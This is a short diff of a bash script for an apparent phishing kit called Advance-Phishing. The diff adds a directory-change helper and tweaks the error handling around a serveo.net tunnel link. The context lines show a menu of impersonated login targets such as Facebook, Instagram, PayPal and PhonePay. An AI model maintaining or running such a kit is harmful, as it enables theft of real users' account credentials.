@@ -1,4 +1,7 @@
 #!/bin/bash
+defa() {
+	cd ~/Advance-Phishing
+	}
 trap 'printf "\n";stop' 2
 stop() {
 
@@ -81,8 +84,7 @@ send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 printf "\n"
 if [ -z $send_link ];then
 random
-printf "\n Error !!\n"
-exit
+printf "\n Error Not working serveo Try again!!\n"
 fi
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Your serveo link:\e[0m\e[1;77m %s \n' $send_link
 
@@ -117,6 +119,7 @@ banner(){
 	figlet Advance
 	random
 	figlet phishing
+	defa
 printf "\e[1;32m[\e[0m\e[1;77m01\e[0m\e[1;32m]\e[0m\e[1;93m Tiktok\e[0m                 \e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;93m Zomato-TFO\e[0m         \e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m Exit         \n"                                                                       
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-TFO\e[0m           \e[1;92m[\e[0m\e[1;77m18\e[0m\e[1;92m]\e[0m\e[1;93m PhonePay-TFO\e[0m       \e[0m\n"                                                                                                                    
 printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Instagram-TFO\e[0m          \e[1;92m[\e[0m\e[1;77m19\e[0m\e[1;92m]\e[0m\e[1;93m Paypal-TFO\e[0m         \e[0m\n"                                                                                           
